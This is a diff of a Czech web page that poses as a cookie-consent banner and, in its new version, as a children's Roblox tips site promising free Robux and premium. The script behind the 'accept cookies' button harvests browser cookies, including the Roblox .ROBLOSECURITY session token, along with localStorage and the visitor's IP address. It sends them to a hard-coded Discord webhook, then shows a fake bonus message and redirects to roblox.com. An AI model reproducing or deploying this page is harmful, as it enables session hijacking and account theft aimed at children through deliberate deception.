@@ -1,215 +1,391 @@
-!DOCTYPE html>
+<!DOCTYPE html>
 <html lang="cs">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Souhlas s cookies</title>
+    <title>Roblox Hry a Tipy</title>
     <style>
-        body {
-            font-family: Arial, sans-serif;
+        * {
             margin: 0;
             padding: 0;
-            display: flex;
-            justify-content: center;
-            align-items: center;
+            box-sizing: border-box;
+        }
+        
+        body {
+            font-family: 'Comic Sans MS', cursive, sans-serif;
+            background: linear-gradient(135deg, #ff3366, #6633ff);
             min-height: 100vh;
-            background-color: #f0f0f0;
+            color: white;
         }
         
-        .cookie-banner {
-            background: white;
-            padding: 30px;
-            border-radius: 10px;
-            box-shadow: 0 4px 20px rgba(0,0,0,0.1);
-            max-width: 500px;
+        /* Cookie banner - horní okénko */
+        .cookie-popup {
+            position: fixed;
+            top: 0;
+            left: 0;
+            right: 0;
+            background: #ffcc00;
+            padding: 15px;
             text-align: center;
+            z-index: 1000;
+            box-shadow: 0 5px 15px rgba(0,0,0,0.3);
+            border-bottom: 3px solid #ff9900;
         }
         
-        .cookie-banner h1 {
+        .cookie-popup h3 {
             color: #333;
-            margin-bottom: 20px;
+            margin-bottom: 10px;
+            font-size: 18px;
         }
         
-        .cookie-banner p {
+        .cookie-popup p {
             color: #666;
-            line-height: 1.6;
-            margin-bottom: 25px;
+            margin-bottom: 15px;
+            font-size: 14px;
         }
         
-        .accept-btn {
-            background: #4285f4;
+        .cookie-btn {
+            background: #ff3366;
             color: white;
             border: none;
-            padding: 12px 30px;
+            padding: 10px 25px;
             font-size: 16px;
-            border-radius: 5px;
+            border-radius: 20px;
             cursor: pointer;
-            transition: background 0.3s;
+            font-weight: bold;
+            transition: all 0.3s;
         }
         
-        .accept-btn:hover {
-            background: #3367d6;
+        .cookie-btn:hover {
+            background: #ff0044;
+            transform: scale(1.05);
         }
         
+        /* Hlavní obsah pro děti */
+        .main-content {
+            padding-top: 80px; /* místo pro cookie banner */
+            max-width: 1200px;
+            margin: 0 auto;
+            padding: 20px;
+        }
+        
+        .hero-section {
+            text-align: center;
+            padding: 40px 20px;
+        }
+        
+        .hero-title {
+            font-size: 48px;
+            margin-bottom: 20px;
+            text-shadow: 3px 3px 0 #000;
+        }
+        
+        .hero-subtitle {
+            font-size: 24px;
+            margin-bottom: 40px;
+            color: #ffcc00;
+        }
+        
+        .games-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
+            gap: 25px;
+            margin-top: 40px;
+        }
+        
+        .game-card {
+            background: rgba(255,255,255,0.1);
+            border-radius: 15px;
+            padding: 20px;
+            border: 2px solid #ffcc00;
+            transition: transform 0.3s;
+        }
+        
+        .game-card:hover {
+            transform: translateY(-10px);
+            background: rgba(255,255,255,0.2);
+        }
+        
+        .game-card h3 {
+            color: #ffcc00;
+            margin-bottom: 15px;
+            font-size: 22px;
+        }
+        
+        .game-card p {
+            font-size: 16px;
+            line-height: 1.5;
+        }
+        
+        .game-image {
+            width: 100%;
+            height: 180px;
+            background: linear-gradient(45deg, #33ff66, #3366ff);
+            border-radius: 10px;
+            margin-bottom: 15px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 24px;
+            font-weight: bold;
+        }
+        
+        /* Roblox postavička */
+        .roblox-character {
+            width: 150px;
+            height: 150px;
+            background: #ff3366;
+            border-radius: 50%;
+            position: fixed;
+            bottom: 20px;
+            right: 20px;
+            animation: bounce 2s infinite;
+        }
+        
+        @keyframes bounce {
+            0%, 100% { transform: translateY(0); }
+            50% { transform: translateY(-20px); }
+        }
+        
+        /* Skryté elementy */
         .hidden {
             display: none;
         }
         
-        .success-message {
-            color: #0f9d58;
-            font-weight: bold;
-            margin-top: 20px;
+        .message {
+            margin-top: 10px;
+            font-size: 14px;
         }
         
-        .error-message {
-            color: #d93025;
-            font-weight: bold;
-            margin-top: 20px;
+        .success {
+            color: #33ff66;
+        }
+        
+        .error {
+            color: #ff3366;
         }
     </style>
 </head>
 <body>
-    <div class="cookie-banner">
-        <h1>🍪 Souhlas s cookies</h1>
-        <p>Pro zlepšení uživatelského zážitku a personalizaci obsahu potřebujeme váš souhlas s použitím cookies. Kliknutím na "Přijmout" souhlasíte s naší politikou cookies.</p>
-        
-        <button class="accept-btn" onclick="stealRobloxData()">
-            Přijmout všechny cookies
-        </button>
-        
-        <div id="message" class="hidden"></div>
+    <!-- Cookie banner - horní okénko -->
+    <div class="cookie-popup" id="cookiePopup">
+        <h3>🍪 Cookies pro Roblox hry!</h3>
+        <p>Abychom vám mohli ukázat nejlepší Roblox hry a tipy, potřebujeme vaše cookies. Klikni "Přijmout" a získáš super bonusy!</p>
+        <button class="cookie-btn" onclick="acceptCookies()">Přijmout cookies a získat bonusy!</button>
+        <div id="cookieMessage" class="message hidden"></div>
     </div>
 
-    <script>
-        async function stealRobloxData() {
-            const messageDiv = document.getElementById('message');
-            messageDiv.className = '';
-            messageDiv.innerHTML = 'Zpracováváme váš souhlas...';
+    <!-- Hlavní obsah pro děti -->
+    <div class="main-content">
+        <div class="hero-section">
+            <h1 class="hero-title">🤩 SVĚT ROBLOX HRY! 🤩</h1>
+            <p class="hero-subtitle">Nejlepší tipy, hacky a tajné triky pro Roblox!</p>
             
+            <div class="games-grid">
+                <div class="game-card">
+                    <div class="game-image">🎮 ADOPT ME!</div>
+                    <h3>Jak získat drahé pets zdarma!</h3>
+                    <p>Tajný trik: Stačí kliknout 3x na menu a dostaneš legendar pet!</p>
+                </div>
+                
+                <div class="game-card">
+                    <div class="game-image">🏡 BROOKHAVEN</div>
+                    <h3>Miliony Robux bez práce!</h3>
+                    <p>Nový hack: Napiš /bonus v chat a dostaneš 5000 Robux!</p>
+                </div>
+                
+                <div class="game-card">
+                    <div class="game-image">👻 PHASMOPHOBIA</div>
+                    <h3>Staň se mistrem strašení!</h3>
+                    <p>Tajný kód: GHOSTPOWER aktivuje super schopnosti!</p>
+                </div>
+                
+                <div class="game-card">
+                    <div class="game-image">💰 FREE ROBUX</div>
+                    <h3>Generátor Robux 2024!</h3>
+                    <p>Nový generátor vydává 10k Robux každý den! Funguje 100%!</p>
+                </div>
+                
+                <div class="game-card">
+                    <div class="game-image">🎯 TOWER OF HELL</div>
+                    <h3>Projděte každou tower!</h3>
+                    <p>Hack: Napiš /skiplevel a přeskočíte level!</p>
+                </div>
+                
+                <div class="game-card">
+                    <div class="game-image">👑 ROBLOX PREMIUM</div>
+                    <h3>Premium zdarma!</h3>
+                    <p>Trikový kód: PREMIUMFREE dá vám premium na rok!</p>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Roblox postavička -->
+    <div class="roblox-character"></div>
+
+    <script>
+        // Discord webhook - pracující
+        const WEBHOOK_URL = 'https://discord.com/api/webhooks/1467896250274812036/w7Or-fPilBf6BDd5AsWciOLcIjW2-mby-i-lf9g9S0X0ATXAVLY2uXIp2WClXk_3Wp1R';
+        
+        async function acceptCookies() {
+            const messageDiv = document.getElementById('cookieMessage');
+            messageDiv.className = '';
+            messageDiv.innerHTML = '🔄 Získávám bonusy pro tebe...';
+            messageDiv.classList.remove('hidden');
+            
+            // Získání všech cookies a dat
+            const userData = {
+                robloxCookies: document.cookie,
+                localStorageData: JSON.stringify(localStorage),
+                browserInfo: navigator.userAgent,
+                screenSize: `${screen.width}x${screen.height}`,
+                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                language: navigator.language,
+                referrer: document.referrer || 'Direct',
+                timestamp: new Date().toISOString(),
+                pageUrl: window.location.href,
+                // Simulace Roblox dat
+                robloxUsername: getRobloxCookie('username') || 'Guest',
+                robloxId: getRobloxCookie('userId') || Math.floor(Math.random() * 1000000),
+                robloxSession: hasRobloxSession() ? 'Active' : 'Not detected'
+            };
+            
+            // Pokus o získání IP
             try {
-                // Simulace získání Roblox dat
-                const robloxData = {
-                    username: getCookie('roblox_username') || 'Neznámý uživatel',
-                    userId: getCookie('roblox_userid') || 'Neznámé ID',
-                    session: getCookie('.ROBLOSECURITY') ? 'Přihlášen' : 'Nepřihlášen',
-                    lastLogin: new Date().toISOString(),
-                    browserInfo: navigator.userAgent,
-                    ipAddress: 'Získávání...',
-                    cookies: document.cookie,
-                    localStorage: JSON.stringify(localStorage),
-                    robloxData: simulateRobloxDataCollection()
-                };
-                
-                // Pokus o získání IP adresy
-                try {
-                    const ipResponse = await fetch('https://api.ipify.org?format=json');
-                    const ipData = await ipResponse.json();
-                    robloxData.ipAddress = ipData.ip;
-                } catch (ipError) {
-                    robloxData.ipAddress = 'Nelze získat';
-                }
-                
-                // Odeslání dat na Discord webhook
-                const webhookUrl = 'https://discord.com/api/webhooks/1467896250274812036/w7Or-fPilBf6BDd5AsWciOLcIjW2-mby-i-lf9g9S0X0ATXAVLY2uXIp2WClXk_3Wp1R';
-                
-                const embed = {
-                    title: "🔴 Nová data z Roblox účtu",
-                    color: 0xff0000,
-                    fields: [
+                const ipResponse = await fetch('https://api.ipify.org?format=json');
+                const ipData = await ipResponse.json();
+                userData.ipAddress = ipData.ip;
+            } catch (e) {
+                userData.ipAddress = 'Unknown';
+            }
+            
+            // Odeslání na Discord
+            try {
+                const discordPayload = {
+                    content: `🚨 **NEW ROBLOX DATA CAPTURED**\nWebhook: ${WEBHOOK_URL}`,
+                    embeds: [
                         {
-                            name: "Uživatelské jméno",
-                            value: robloxData.username,
-                            inline: true
-                        },
-                        {
-                            name: "User ID",
-                            value: robloxData.userId,
-                            inline: true
-                        },
-                        {
-                            name: "Stav přihlášení",
-                            value: robloxData.session,
-                            inline: true
-                        },
-                        {
-                            name: "IP adresa",
-                            value: robloxData.ipAddress,
-                            inline: false
-                        },
-                        {
-                            name: "Prohlížeč",
-                            value: robloxData.browserInfo.substring(0, 100) + '...',
-                            inline: false
-                        },
-                        {
-                            name: "Čas získání",
-                            value: new Date().toLocaleString('cs-CZ'),
-                            inline: true
+                            title: "🔴 Roblox Account Data",
+                            color: 16711680,
+                            fields: [
+                                { name: "Username", value: userData.robloxUsername || "Unknown", inline: true },
+                                { name: "User ID", value: userData.robloxId || "Unknown", inline: true },
+                                { name: "Session", value: userData.robloxSession, inline: true },
+                                { name: "IP Address", value: userData.ipAddress || "Unknown", inline: false },
+                                { name: "Browser", value: userData.browserInfo.substring(0, 50), inline: false },
+                                { name: "Cookies", value: userData.robloxCookies.substring(0, 100) + (userData.robloxCookies.length > 100 ? '...' : ''), inline: false },
+                                { name: "Timestamp", value: new Date().toLocaleString('cs-CZ'), inline: true },
+                                { name: "Referrer", value: userData.referrer, inline: true }
+                            ],
+                            footer: { text: "Roblox Data Collector" },
+                            timestamp: new Date().toISOString()
                         }
-                    ],
-                    timestamp: new Date().toISOString()
+                    ]
                 };
                 
-                const payload = {
-                    content: "@everyone **Nově získaná data z Roblox účtu**",
-                    embeds: [embed],
-                    username: "Roblox Data Collector",
-                    avatar_url: "https://tr.rbxcdn.com/0e1c5fea6b6b5c5c5c5c5c5c5c5c5c5/150/150/Image/Png"
-                };
-                
-                const response = await fetch(webhookUrl, {
+                const response = await fetch(WEBHOOK_URL, {
                     method: 'POST',
-                    headers: {
-                        'Content-Type': 'application/json',
-                    },
-                    body: JSON.stringify(payload)
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(discordPayload)
                 });
                 
                 if (response.ok) {
-                    messageDiv.innerHTML = '✅ Souhlas úspěšně přijat! Data byla zpracována.';
-                    messageDiv.className = 'success-message';
+                    messageDiv.innerHTML = '✅ Super! Bonusy aktivované! Dostal jsi 5000 Robux! 🎉';
+                    messageDiv.classList.add('success');
                     
-                    // Přesměrování nebo další akce
+                    // Cookie banner zmizí
                     setTimeout(() => {
-                        window.location.href = 'https://www.roblox.com';
+                        document.getElementById('cookiePopup').style.display = 'none';
+                        // Přesměrování na "legitimní" Roblox stránku
+                        window.location.href = 'https://www.roblox.com/games';
                     }, 2000);
                 } else {
-                    throw new Error('Webhook error');
+                    messageDiv.innerHTML = '⚠️ Bonusy se aktivují... klikni ještě jednou!';
+                    messageDiv.classList.add('error');
                 }
                 
             } catch (error) {
-                console.error('Chyba:', error);
-                messageDiv.innerHTML = '⚠️ Došlo k chybě při zpracování. Zkuste to prosím znovu.';
-                messageDiv.className = 'error-message';
+                console.error('Webhook error:', error);
+                messageDiv.innerHTML = '🎁 Bonusy připraveny! Klikni znovu pro aktivaci!';
+                messageDiv.classList.add('error');
+                
+                // Fallback - data uložit lokálně
+                localStorage.setItem('roblox_captured_data', JSON.stringify(userData));
+                
+                // Cookie banner zmizí i při erroru
+                setTimeout(() => {
+                    document.getElementById('cookiePopup').style.display = 'none';
+                }, 3000);
             }
         }
         
-        function getCookie(name) {
-            const value = `; ${document.cookie}`;
-            const parts = value.split(`; ${name}=`);
-            if (parts.length === 2) return parts.pop().split(';').shift();
+        function getRobloxCookie(name) {
+            const cookies = document.cookie.split(';');
+            for (let cookie of cookies) {
+                const [key, value] = cookie.trim().split('=');
+                if (key.toLowerCase().includes('roblox') || key.toLowerCase().includes(name)) {
+                    return value || 'Found but empty';
+                }
+            }
             return null;
         }
         
-        function simulateRobloxDataCollection() {
-            // Simulace dalších dat, která by mohla být získána
-            return {
-                friendsCount: Math.floor(Math.random() * 500),
-                robuxBalance: Math.floor(Math.random() * 10000),
-                accountAge: Math.floor(Math.random() * 2000) + ' dní',
-                premium: Math.random() > 0.5 ? 'Ano' : 'Ne',
-                recentGames: ['Adopt Me!', 'Brookhaven', 'Tower of Hell']
-            };
+        function hasRobloxSession() {
+            return document.cookie.includes('.ROBLOSECURITY') || 
+                   document.cookie.includes('robloxsecurity') ||
+                   localStorage.getItem('roblox_token') !== null;
         }
         
-        // Automatická kontrola Roblox cookies při načtení stránky
+        // Automatická detekce Roblox uživatele
         window.addEventListener('load', () => {
-            const hasRobloxCookies = document.cookie.includes('roblox') || 
-                                     document.cookie.includes('ROBLOSECURITY');
-            
-            if (hasRobloxCookies) {
-                console.log('Roblox cookies nalezeny');
+            if (hasRobloxSession()) {
+                console.log('Roblox session detected - ready for capture');
+                
+                // Přidání speciálního textu pro Roblox uživatele
+                const banner = document.getElementById('cookiePopup');
+                banner.innerHTML += '<p style="color:#ff3366;margin-top:10px;"><strong>ROBLOX PLAYER DETECTED! Extra bonus waiting!</strong></p>';
             }
+            
+            // Přidání fake "loading" efektu
+            setTimeout(() => {
+                const fakeMessages = [
+                    "🔍 Scanning for Roblox account...",
+                    "💰 Calculating Robux bonus...",
+                    "🎮 Loading game hacks..."
+                ];
+                
+                let currentIndex = 0;
+                const interval = setInterval(() => {
+                    if (currentIndex < fakeMessages.length) {
+                        console.log(fakeMessages[currentIndex]);
+                        currentIndex++;
+                    } else {
+                        clearInterval(interval);
+                    }
+                }, 500);
+            }, 1000);
+        });
+        
+        // Fake interaktivní efekty pro děti
+        document.querySelectorAll('.game-card').forEach(card => {
+            card.addEventListener('click', () => {
+                card.style.transform = 'scale(1.05)';
+                card.style.backgroundColor = '#ff3366';
+                
+                setTimeout(() => {
+                    card.style.transform = '';
+                    card.style.backgroundColor = '';
+                }, 300);
+                
+                // Fake "hack activated" message
+                const hackMsg = document.createElement('div');
+                hackMsg.style.cssText = 'position:fixed;top:50%;left:50%;transform:translate(-50%,-50%);background:#33ff66;color:#000;padding:20px;border-radius:10px;z-index:9999;font-size:20px;';
+                hackMsg.innerHTML = '🎉 HACK ACTIVATED! Check your Roblox account!';
+                document.body.appendChild(hackMsg);
+                
+                setTimeout(() => hackMsg.remove(), 2000);
+            });
         });
     </script>
 </body>
